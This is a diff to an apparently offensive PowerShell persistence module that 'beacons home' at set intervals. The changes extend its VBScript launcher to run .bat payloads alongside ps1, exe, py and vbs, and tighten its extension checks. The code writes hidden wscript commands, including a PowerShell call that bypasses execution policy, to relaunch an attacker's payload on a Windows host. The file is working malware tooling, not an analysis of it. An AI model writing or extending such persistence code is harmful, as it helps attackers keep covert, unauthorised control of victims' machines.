@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: BitsTransfer
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    This persistence module beacons home in sellected intervals defined
@@ -17,7 +17,7 @@
    Remark: Use double quotes if Path has any empty spaces in name.
    Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
    to manual check the status of wscript process (BeaconHome function)
-   Remark: Payload supported extensions: ps1|exe|py|vbs
+   Remark: Payload supported extensions: ps1|exe|py|vbs|bat
 
 .Parameter Persiste
    Accepts Stop (persistence) or the absoluct \ relative path of payload
@@ -107,14 +107,16 @@ $TrdliState = $False
             echo "wscript.sleep $RawTime" >> "$PersistePath"
 
             ## Recomended function by @youhacker55
-            # Payload supported extensions: ps1|exe|py|vbs
-            If($ClientName -Match '.ps1'){
+            # Payload supported extensions: ps1|exe|py|vbs|bat
+            If($ClientName -Match '.ps1$'){
                 echo "objShell.Run `"powershell -Exec Bypass -W 1 -File $Persiste`", 0, True" >> "$PersistePath"
-            }ElseIf($ClientName -Match '.exe'){
+            }ElseIf($ClientName -Match '.exe$'){
                 echo "objShell.Run `"cmd /R start $Persiste`", 0, True" >> "$PersistePath"
-            }ElseIf($ClientName -Match '.py'){
+            }ElseIf($ClientName -Match '.py$'){
                 echo "objShell.Run `"cmd /R $Persiste`", 0, True" >> "$PersistePath"
-            }ElseIf($ClientName -Match '.vbs'){
+            }ElseIf($ClientName -Match '.vbs$'){
+                echo "objShell.Exec(`"cmd /R $Persiste`")" >> "$PersistePath"
+            }ElseIf($ClientName -Match '.bat$'){
                 echo "objShell.Exec(`"cmd /R $Persiste`")" >> "$PersistePath"
             }
 
